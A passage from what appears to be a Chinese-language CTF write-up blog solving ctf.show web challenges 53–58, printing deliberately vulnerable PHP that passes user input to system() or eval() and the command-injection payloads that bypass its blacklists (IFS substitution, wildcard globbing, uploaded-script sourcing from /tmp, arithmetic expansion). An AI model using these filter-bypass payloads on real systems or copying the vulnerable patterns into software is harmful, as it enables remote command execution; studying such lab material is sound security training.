</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;no&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://009c1d7c-5a7a-44a5-8a5c-9fdea5fa3cac.challenge.ctf.show/?c=ta&#39;&#39;c${IFS}fla&#39;&#39;g.php
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web54" class="headerLink">
    <a href="#web54" class="header-mark"></a>[web54]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>先改名为<code>a.txt</code>：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://9d8e8af5-98cb-4ac4-9589-566680643379.challenge.ctf.show/?c=mv${IFS}fl??.???${IFS}a.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后直接访问</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://9d8e8af5-98cb-4ac4-9589-566680643379.challenge.ctf.show/a.txt
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="web55" class="headerLink">
    <a href="#web55" class="header-mark"></a>[web55]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 20:03:51
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|[a-z]|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>无字母RCE</strong></p>
<p>由于过滤了字母，但没有过滤数字，我们尝试使用/bin目录下的可执行程序。</p>
<p><code>?c=/bin/base64 flag.php</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://09b4ab86-9c0f-4b01-ab1b-c62620f27051.challenge.ctf.show/?c=/???/????64 ????.???
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230706153123230.png" title="image-20230706153123230" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230706153123230.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230706153123230.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230706153123230.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230706153123230.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230706153123230.png 2x"
            sizes="auto"
            alt="image-20230706153123230">
    </a></figure></p>
<p>复制出来base64解码</p>
<h3 id="web56" class="headerLink">
    <a href="#web56" class="header-mark"></a>[web56]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|[a-z]|[0-9]|</span><span class="se">\\</span><span class="s2">$|\(|\{|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|\&gt;|\&lt;/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>过滤了所有的字母和数字，以及一系列的符号。</p>
<p>本题最值得推敲的点就是<strong>无字母数字的命令执行</strong></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener noreferrer">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
<p>我们上传到Linux系统中的文件，都会被存放到/tmp目录下，并且传入生成的临时文件，只有传入的php文件中含有大写字母，且默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母，而且可以发现，只有PHP生成的临时文件包含大写字母，因此可以使用方法来选择传入的php文件<code>/???/???[@-[]</code></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707012445223.png" title="image-20230707012445223" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707012445223.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707012445223.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707012445223.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707012445223.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707012445223.png 2x"
            sizes="auto"
            alt="image-20230707012445223">
    </a></figure></p>
<p>从ascii码表可以看出，大写字母是被@和[两个字符所包围的，因此[@-[]可以用来表示所有的大写字母。</p>
<img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230706232826182.png" alt="image-20230706232826182" style="zoom:50%;" />
<p>看了许多关于本题的博客，发现解题方法不外乎通过构造一个html poc：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>POST数据包POC<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://d06e4766-59a3-43fc-af3b-6dd6f1fd84a3.challenge.ctf.show/&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;multipart/form-data&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!--链接是当前打开的题目链接--&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&#34;file&#34;</span><span class="p">&gt;</span>文件名：<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;file&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;file&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;提交&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>通过phpstudy搭建本地环境，我把它命名为<code>test.html</code></p>
<p>然后进入<code>http://127.0.0.1/test.html</code></p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707005144151.png" title="image-20230707005144151" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707005144151.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707005144151.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707005144151.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707005144151.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707005144151.png 2x"
            sizes="auto"
            alt="image-20230707005144151">
    </a></figure></p>
<p>通过该页面实现对题目的文件上传</p>
<p>在需要上传的php文件中写入</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/sh
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>ls
</span></span></code></pre></td></tr></table>
</div>
</div><p>上传的同时开启抓包拦截，修改get传参部分</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?c=.%20/???/????????[@-[]
</span></span></code></pre></td></tr></table>
</div>
</div><p>并发送到repeater</p>
<img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707005302632.png" alt="image-20230707005302632" style="zoom: 80%;" />
<p>可以直接在repeater中修改所上传的文件内容，来获取flag
<img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707005412291.png" alt="image-20230707005412291" style="zoom: 50%;" /></p>
<h3 id="web57" class="headerLink">
    <a href="#web57" class="header-mark"></a>[web57]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-08 01:02:56
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 还能炫的动吗？
</span></span></span><span class="line"><span class="cl"><span class="c1">//flag in 36.php
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\;|[a-z]|[0-9]|\`|\|\#|\&#39;|</span><span class="se">\&#34;</span><span class="s2">|\`|\%|</span><span class="se">\x09</span><span class="s2">|</span><span class="se">\x26</span><span class="s2">|</span><span class="se">\x0a</span><span class="s2">|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&#34;</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;cat &#34;</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="s2">&#34;.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>题目中已经提示flag在36.php中了，根据题目可知，我们只需要绕过过滤传参36即可</p>
<p>python脚本：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;$((~$((&#34;</span><span class="o">+</span><span class="s2">&#34;$((~$(())))&#34;</span><span class="o">*</span><span class="mi">37</span><span class="o">+</span><span class="s2">&#34;))))&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$((&#34;&#34;))值为0,$((~$((&#34;&#34;))))值为-1
</span></span></code></pre></td></tr></table>
</div>
</div><p>注意的是：<code>${_}会输出上一次的执行结果</code></p>
</blockquote>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707013217343.png" title="image-20230707013217343" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707013217343.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707013217343.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707013217343.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707013217343.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707013217343.png 2x"
            sizes="auto"
            alt="image-20230707013217343">
    </a></figure></p>
<p>payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://cdc732c6-8cd0-470d-9010-35488663232b.challenge.ctf.show/?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
</span></span></code></pre></td></tr></table>
</div>
</div><p>传参之后页面是没有回显的，按ctrl+u查看源码可得到：
<figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707013302782.png" title="image-20230707013302782" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707013302782.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707013302782.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707013302782.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707013302782.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707013302782.png 2x"
            sizes="auto"
            alt="image-20230707013302782">
    </a></figure></p>
<h3 id="web58" class="headerLink">
    <a href="#web58" class="header-mark"></a>[web58]</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Author: Lazzaro
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Date:   2020-09-05 20:49:30
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="cl"><span class="cm"># @Last Modified time: 2020-09-07 22:02:47
</span></span></span><span class="line"><span class="cl"><span class="cm"># @email: h1xa@ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm"># @link: https://ctfer.com
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// 你们在炫技吗？
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$c</span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>直接用system()函数发现被禁了</p>
<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707014326061.png" title="image-20230707014326061" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707014326061.png">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707014326061.png"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707014326061.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707014326061.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230707014326061.png 2x"
            sizes="auto"
            alt="image-20230707014326061">
    </a></figure></p>
<p>可以用file_get_contents</p>
